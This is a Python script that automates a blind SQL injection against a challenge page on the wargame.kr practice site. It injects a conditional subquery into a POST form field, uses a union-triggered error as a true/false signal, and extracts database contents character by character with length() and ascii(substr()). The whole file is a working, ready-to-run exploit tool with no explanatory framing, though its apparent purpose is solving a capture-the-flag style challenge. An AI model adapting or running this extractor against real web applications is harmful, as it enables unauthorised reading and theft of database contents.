import sys
from urllib import request, parse

def get_ascii(param):
    url  = 'http://wargame.kr:8080/qna/?page=to_jsmaster'
    idx = 0
    while(True):
        idx += 1
        data = f'cont=asdfsr&mail=ser&type=if((select {param}={idx}), (select 1 union select 2), 5)'.encode()

        #if((select param = idx), (select 1 union select 2), 5)

        req = request.Request(url, data)
        req.add_header('User-Agent', 'Mozilla/5.0')

        res = request.urlopen(req).read().decode()
        if 'send success' not in res:
            return idx
        elif idx > 150 :
            return "error"
    


def get_length(query):
    return get_ascii("length(%s)" % query)
    # length((select table_name from information_schema.tables))

def get_content(query):
    query = '(' + query + ')'
    content_len = get_length(query)
    #select table_name from information_schema.tables limit 200, 1
    content = ''
    # print(content_len)
    if content_len == 0:
        print('Invalid input')
        return ''
    if content_len == "error":
        print("Error")
        return "error"
    for idx in range(1, content_len + 1):
        content += chr(get_ascii('ascii(substr(%s,%d,1))' % (query, idx)))
        sys.stdout.write('\r[' + str(content_len) + '] ' + content + '_' * (content_len - len(content)))

    sys.stdout.write('\n')

    return content



if len(sys.argv) < 2:
    sys.stdout.write('인자값이 없습니다.')
    exit()
print(sys.argv[1])
content = get_content(' '.join(sys.argv[1:]))
